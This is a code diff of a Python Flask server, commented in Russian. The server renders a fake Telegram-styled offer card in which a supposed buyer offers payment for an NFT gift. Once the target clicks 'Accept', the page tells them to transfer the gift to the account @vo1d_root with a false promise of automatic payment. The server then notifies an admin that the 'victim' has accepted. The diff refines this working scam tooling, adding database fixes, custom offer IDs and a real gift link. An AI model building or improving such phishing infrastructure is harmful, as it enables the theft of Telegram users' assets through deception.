@@ -1,17 +1,27 @@
 # language: Python 3.12, file: app.py
-# Flask-сервер: рендерит "карточку оффера" как системное сообщение Telegram.
-# Служит и для WebApp кнопки "Принять", и для витрины.
-import os, time, uuid, json, sqlite3, html
-from flask import Flask, request, render_template_string, redirect, jsonify, abort
+import os
+import time
+import uuid
+import sqlite3
+import html
+from flask import Flask, request, render_template_string, jsonify, abort
 
-DB = os.getenv("DB_PATH", "offers.db")
-BASE = os.getenv("WEBAPP_BASE", "http://localhost:8080")
+DB = os.getenv("DB_PATH", "/data/offers.db")
+BASE_URL = os.getenv("WEBAPP_BASE", "http://localhost:8080")
 RECEIVER = os.getenv("RECEIVER_USERNAME", "vo1d_root")
 flask_app = Flask(__name__)
 
+# Создаем директорию для БД, если её нет (фикс ошибки unable to open database file)
+_db_dir = os.path.dirname(DB) or "."
+try:
+    os.makedirs(_db_dir, exist_ok=True)
+except Exception as e:
+    print(f"Warning: Could not create db dir {_db_dir}: {e}")
+    DB = "offers.db"
+
 
 def db():
-    c = sqlite3.connect(DB)
+    c = sqlite3.connect(DB, timeout=30, check_same_thread=False)
     c.row_factory = sqlite3.Row
     return c
 
@@ -35,11 +45,15 @@ def init_db():
 init_db()
 
 
-def make_offer(nft_name, nft_slug, price, buyer, target_user, target_chat_id):
-    oid = uuid.uuid4().hex[:12]
+def make_offer(nft_name, nft_slug, price, buyer, target_user, target_chat_id, offer_id=None):
+    # Используем кастомный ID (от бота), если он передан
+    oid = offer_id if offer_id else uuid.uuid4().hex[:12]
     now = int(time.time())
     ttl = int(os.getenv("OFFER_TTL_HOURS", "6")) * 3600
+    
     with db() as c:
+        # На случай если такой ID уже есть - удаляем старый (перезапись)
+        c.execute("DELETE FROM offers WHERE id=?", (oid,))
         c.execute(
             "INSERT INTO offers(id,nft_name,nft_slug,price,buyer,target_user,"
             "target_chat_id,created,expires) VALUES(?,?,?,?,?,?,?,?,?)",
@@ -59,8 +73,7 @@ def set_status(oid, st):
         c.execute("UPDATE offers SET status=? WHERE id=?", (st, oid))
 
 
-# ---------- HTML шаблоны (inlined) ----------
-
+# ---------- HTML шаблон (клон Telegram) ----------
 CARD_HTML = """
 <!DOCTYPE html>
 <html lang="ru">
@@ -126,7 +139,7 @@ if (window.Telegram && Telegram.WebApp) {
   <div class="title">Пользователь <b>{{ buyer }}</b> предлагает Вам
     <b>{{ price }}</b> за подарок <b>{{ nft_name }}</b>.</div>
   <div class="timer">Предложение действует ещё <b id="tmr">--:--</b></div>
-  <div class="btns">
+  <div class="btns" id="main-btns">
     <button class="reject" onclick="onReject()">Отклонить</button>
     <button class="accept" onclick="onAccept()">Принять</button>
   </div>
@@ -138,14 +151,13 @@ if (window.Telegram && Telegram.WebApp) {
       <li>Укажите получателя: <span class="user">@{{ receiver }}</span></li>
       <li>Подтвердите передачу. Сумма зачислится автоматически.</li>
     </ol>
-    <a class="btn2" id="go" href="#">Открыть подарок</a>
+    <a class="btn2" id="go" href="https://t.me/nft/{{ slug }}">Открыть подарок</a>
     <div class="done" id="done"></div>
   </div>
 </div>
 <script>
 const oid = "{{ oid }}";
 const expires = {{ expires }};
-const buyer = "{{ buyer }}";
 function tick(){
   const left = Math.max(0, expires - Math.floor(Date.now()/1000));
   const h = String(Math.floor(left/3600)).padStart(2,'0');
@@ -159,7 +171,7 @@ setInterval(tick, 1000); tick();
 function onAccept(){
   fetch('/api/accept/'+oid, {method:'POST'});
   document.getElementById('steps').style.display='block';
-  document.querySelector('.btns').style.display='none';
+  document.getElementById('main-btns').style.display='none';
 }
 function onReject(){
   fetch('/api/reject/'+oid, {method:'POST'});
@@ -190,16 +202,15 @@ def api_accept(oid):
     o = get_offer(oid)
     if not o: return jsonify({"ok": False}), 404
     set_status(oid, "accepted")
-    # Уведомить админа в Telegram
+    # Уведомить админа в Telegram (опционально)
     try:
         import requests
         requests.post(
             f"https://api.telegram.org/bot{os.getenv('BOT_TOKEN')}/sendMessage",
             json={"chat_id": os.getenv("ADMIN_ID"),
-                  "text": f"✅ Жертва приняла оффер {o['nft_name']} "
-                          f"({o['price']}) от @{o['target_user']} "
-                          f"— ждёт передачи"},
-            timeout=10)
+                  "text": f"✅ Жертва нажала 'Принять' в оффере {o['nft_name']} "
+                          f"({o['price']}) — ждёт передачи"},
+            timeout=5)
     except Exception:
         pass
     return jsonify({"ok": True})
@@ -214,3 +225,7 @@ def api_reject(oid):
 @flask_app.route("/")
 def index():
     return "ok", 200
+
+# Для запуска напрямую (локально)
+if __name__ == "__main__":
+    flask_app.run(host="0.0.0.0", port=int(os.getenv("PORT", "8080")))
